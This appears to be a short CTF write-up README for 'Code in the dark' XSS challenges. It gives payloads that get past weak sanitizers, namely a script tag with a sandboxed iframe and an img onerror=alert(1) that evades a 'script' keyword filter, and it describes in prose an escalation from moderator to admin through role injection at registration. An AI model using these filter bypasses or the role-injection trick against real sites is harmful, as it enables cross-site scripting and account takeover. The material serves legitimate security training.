# CTF-CodeInTheDark
Interlogica CTF Code in the dark.

## 1 

Trigger an alert(1) in the small browser by evading the sanitizer's countermeasures. NOTE: the alert must be triggerable offline and without any further actions by the user.
The page has an input and renders the input after running a function on your code.
```
function sanitize(input) {
    // warmup
    return input;
}
```

Hints:  
Browser says `An iframe which has both allow-scripts and allow-same-origin for its sandbox attribute can escape its sandboxing.`.


Solution:
```
<iframe src="http%3A//hithere" 
        scrolling="no" sandbox="allow-scripts allow-popups allow-modals allow-same-origin" 
        name="sandbox" style="width: 100%; height: 100%; border: 0px;"></iframe>
<script>
   alert(1);
</script>
```

## 2

The page has an input and renders the input after running a function on your code.
```
function sanitize(input) {
    // no scripts!
    if (input.toLowerCase().includes('script')) {
        return 'NO!';
    }
    return input;
}
```

Solution:
```
<img src="" onerror=alert(1)>
```

Thanks pal.

## 4
Register. Password of moderator is in the user profile image. Get sources as moderator. Sources show that registratin take role too. Register as admin. As admin go to admin page and see flag.